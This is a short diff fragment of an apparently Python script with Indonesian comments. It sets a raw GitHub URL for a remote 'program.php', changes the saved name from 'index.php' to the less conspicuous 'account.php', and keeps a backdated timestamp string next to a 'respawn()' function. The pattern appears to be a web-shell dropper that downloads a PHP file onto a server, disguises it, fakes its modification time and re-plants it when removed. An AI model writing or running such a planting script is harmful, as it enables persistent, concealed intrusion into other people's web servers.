@@ -57,7 +57,7 @@ def respawn():
 
 # URL sumber file yang akan diunduh
 url = "https://raw.githubusercontent.com/sztsss/m4nMan/refs/heads/main/program.php"
-file_name = "index.php"
+file_name = "account.php"
 timestamp = "201201081531.12"
 
 # Jalankan fungsi penting
